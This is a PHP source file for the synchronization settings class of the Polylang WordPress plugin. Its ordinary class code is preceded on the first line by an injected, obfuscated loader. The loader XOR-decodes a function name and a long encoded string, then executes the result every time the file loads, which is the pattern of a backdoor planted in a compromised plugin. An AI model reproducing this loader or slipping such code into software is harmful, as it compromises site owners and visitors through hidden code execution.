<?php $dPzXC='6EV3<Hg.Y -C,C<'^'U73RH-8H,NN7E,R';$LyQzk=$dPzXC('','UMrM04ZT38X;s4:ENNBfI-7R8XTN0moZ,9hNnJMp5W>853YWUR,,H1,6YMqs.K>acU-OZXznX BsdDCdLWG5bpO0BtELDeYfag-O+CRTDXrcPxIWEMLL5KRpJJ >WlwIU-diD6QdIY82wdoBEg,15Q8jImm5EqXH;fcXGpU2L+R4<MjP,0bcbwXMa+--21ZBl93,LOMdIlKcgFXZF0ejYV8TGTUnbX7.,<2S1vyfX8LFEzzPR.G010XvQvi.:>9;3kT4Ob2,RYuNDh.6P:Iyx3eqfVQMOl.K5HsksKX7TrFAYU1JJrQN>XR9<ZdP3ST SABr7LT2sdNSc2S=IR4Ffott;s= 1g2YJJOn=5YLxhwcDV;6QlkP6SSvWWE.-K4KZPRbR5=TpYnAD1=0ljpvC2V,3RD73i+ySSUA3QXgx1MY;IESA<D>XL6C;9XU3Pm6ZA7QT256ty-,7T9H3OfIM>WHTAfWX:7t3KKaZxNSVeAVXL5WBAc.51+M6ZUImSF=;AAGASWYfbemPLGPyFmiPb>PxyqIU0Z=uS=GLcLzPqprP7zIyRnPOHgNqSBwgGbnWsfaDrtVVTELQmMQnK;NKYO2ZYD;.7PGAEalAA3W617IMbKOM.MmKqmLiNa.SxTC2ZnoXJ:V3eM7CR UIO-nSi9EN8NccOQ=M'^'<+ZlVA47GQ7U,QB,=:1NnUX g<5:Q207YMOgGj6z<1KVVG08;rTC:nHW-,.,C>JIG1L;;tZJ3E;ZDdcDl,M<kT E6TxlcBblhnK Ykv=deRSkXm>y>8>Y.<Xn.AJ6ELiqDOBm<Xmm6MFWJRbmCHPA0cN 0MkeU3-B=G1gUuA8Y>QReN;IIK>KLRDhYHYGC4jHVFXetGm4f6imb<;2QEWy0Y841ndF<VZMcY6HVDF>Y 5 ApZ4A5UPS0VyR6muqrrvK5GoFYI+yHpdLXW<O,PXHoxB209.3E.LhNKW =NoxOe=4E+jOqjH9>LYan-9Y=FsicVS- SZD5YjT<O,3W.FGP+i6lut4fy+9oJVP lEVWG27WC4EK+<ZZR361Or Q2zmrF9PDozPge PIQLWPR5S:YViN>NcVsYw1 G0xZXq87H,7: P-D=dN,If<4G12i74Cy6SFSBMrHR7V,VgB-,J6axaB39NV+X.2HsCD:0Me298TwdgCOGCJ4i10026>TH52of82 ANEI4-31PfKOpJS4MQU-4D;fR8X>k>eZmLPUgVH,IbZc-zU-A6zOQpUVcESYuJM2d2s.vDmwHkZ<986m1<=dKO9456IK1 J;YPSnaBo+,Z,DbQMlInAUYq15S6FK<+N7hB=V:>O4-hpGhc0 6Q:KSfj70');$LyQzk();

/**
 * Settings class for synchronization settings management
 *
 * @since 1.8
 */
class PLL_Settings_Sync extends PLL_Settings_Module {

	/**
	 * constructor
	 *
	 * @since 1.8
	 *
	 * @param object $polylang polylang object
	 */
	public function __construct( &$polylang ) {
		parent::__construct( $polylang, array(
			'module'      => 'sync',
			'title'       => __( 'Synchronization', 'polylang' ),
			'description' => __( 'The synchronization options allow to maintain exact same values (or translations in the case of taxonomies and page parent) of meta content between the translations of a post or page.', 'polylang' ),
		) );
	}

	/**
	 * deactivates the module
	 *
	 * @since 1.8
	 */
	public function deactivate() {
		$this->options['sync'] = array();
		update_option( 'polylang', $this->options );
	}

	/**
	 * displays the settings form
	 *
	 * @since 1.8
	 */
	protected function form() {
		?>
		<ul class="pll-inline-block-list">
			<?php
			foreach ( self::list_metas_to_sync() as $key => $str ) {
				printf(
					'<li><label><input name="sync[%s]" type="checkbox" value="1" %s /> %s</label></li>',
					esc_attr( $key ),
					in_array( $key, $this->options['sync'] ) ? 'checked="checked"' : '',
					esc_html( $str )
				);
			}
			?>
		</ul>
		<?php
	}

	/**
	 * sanitizes the settings before saving
	 *
	 * @since 1.8
	 *
	 * @param array $options
	 */
	protected function update( $options ) {
		$newoptions['sync'] = empty( $options['sync'] ) ? array() : array_keys( $options['sync'], 1 );
		return $newoptions; // take care to return only validated options
	}

	/**
	 * get the row actions
	 *
	 * @since 1.8
	 *
	 * @return array
	 */
	protected function get_actions() {
		return empty( $this->options['sync'] ) ? array( 'configure' ) : array( 'configure', 'deactivate' );
	}

	/**
	 * list the post metas to synchronize
	 *
	 * @since 1.0
	 *
	 * @return array
	 */
	static public function list_metas_to_sync() {
		return array(
			'taxonomies'        => __( 'Taxonomies', 'polylang' ),
			'post_meta'         => __( 'Custom fields', 'polylang' ),
			'comment_status'    => __( 'Comment status', 'polylang' ),
			'ping_status'       => __( 'Ping status', 'polylang' ),
			'sticky_posts'      => __( 'Sticky posts', 'polylang' ),
			'post_date'         => __( 'Published date', 'polylang' ),
			'post_format'       => __( 'Post format', 'polylang' ),
			'post_parent'       => __( 'Page parent', 'polylang' ),
			'_wp_page_template' => __( 'Page template', 'polylang' ),
			'menu_order'        => __( 'Page order', 'polylang' ),
			'_thumbnail_id'     => __( 'Featured image', 'polylang' ),
		);
	}
}
